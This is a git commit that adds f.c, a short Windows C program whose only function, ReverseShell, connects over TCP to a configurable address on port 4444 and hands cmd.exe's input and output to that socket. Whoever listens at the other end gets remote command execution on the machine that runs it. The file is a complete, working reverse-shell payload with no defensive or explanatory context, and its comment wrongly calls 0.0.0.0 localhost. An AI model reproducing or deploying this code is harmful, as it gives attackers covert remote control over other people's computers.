00b5d57c4495dcca0e069b37b338e284d7412db3
thewifiproject <pierrejacksoo@seznam.cz>
2024-12-24 19:14:10 +0100

    Update and rename lport.go to f.c

---
+++ f.c
@@ -0,0 +1,71 @@
+#include <winsock2.h>
+#include <windows.h>
+#include <stdio.h>
+
+#pragma comment(lib, "Ws2_32.lib")
+
+#define SERVER_IP "0.0.0.0" // Connects to localhost
+#define SERVER_PORT 4444    // Port to connect to
+#define DEFAULT_BUFLEN 1024
+
+void ReverseShell() {
+    WSADATA wsaData;
+    SOCKET sock = INVALID_SOCKET;
+    struct sockaddr_in server;
+
+    // Initialize Winsock
+    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
+        return;
+    }
+
+    // Create a socket
+    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    if (sock == INVALID_SOCKET) {
+        WSACleanup();
+        return;
+    }
+
+    // Configure the server address
+    server.sin_family = AF_INET;
+    server.sin_port = htons(SERVER_PORT);
+    server.sin_addr.s_addr = inet_addr(SERVER_IP);
+
+    // Connect to the server
+    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) == SOCKET_ERROR) {
+        closesocket(sock);
+        WSACleanup();
+        return;
+    }
+
+    // Redirect input/output/error streams
+    STARTUPINFO si;
+    PROCESS_INFORMATION pi;
+    memset(&si, 0, sizeof(si));
+    si.cb = sizeof(si);
+    si.dwFlags = STARTF_USESTDHANDLES;
+    si.hStdInput = (HANDLE)sock;
+    si.hStdOutput = (HANDLE)sock;
+    si.hStdError = (HANDLE)sock;
+
+    // Launch cmd.exe
+    char command[] = "cmd.exe";
+    if (!CreateProcess(NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
+        closesocket(sock);
+        WSACleanup();
+        return;
+    }
+
+    // Wait for the process to exit
+    WaitForSingleObject(pi.hProcess, INFINITE);
+
+    // Cleanup
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
+    closesocket(sock);
+    WSACleanup();
+}
+
+int main() {
+    ReverseShell();
+    return 0;
+}
